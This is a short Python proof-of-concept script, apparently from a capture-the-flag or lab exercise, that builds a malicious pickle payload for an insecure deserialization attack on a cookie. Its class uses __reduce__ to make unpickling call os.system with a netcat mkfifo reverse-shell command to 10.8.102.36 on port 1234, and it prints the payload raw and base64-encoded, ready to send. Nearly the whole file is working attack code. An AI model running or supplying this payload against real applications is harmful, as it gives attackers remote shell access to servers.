# # POC

# import pickle

# cookie = b"gASVCwAAAAAAAACMB3Rlc3RpbmeULg=="
# from base64 import b64decode
# test = b64decode(cookie)
# print(test)
# print(pickle.loads(test))

'''
What is __reduce__ ?

Whenever an object is pickled, the __reduce__ method defined by it gets called.

'''


import pickle
from base64 import b64encode, urlsafe_b64encode

class Revshell:

	def __reduce__(self):
		
		import os

		exploit = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.102.36 1234 >/tmp/f"

		return os.system, (exploit,)


if __name__ == "__main__":
	
	payload = pickle.dumps(Revshell())
	print(payload)
	print(b64encode(payload))
	print(urlsafe_b64encode(payload))


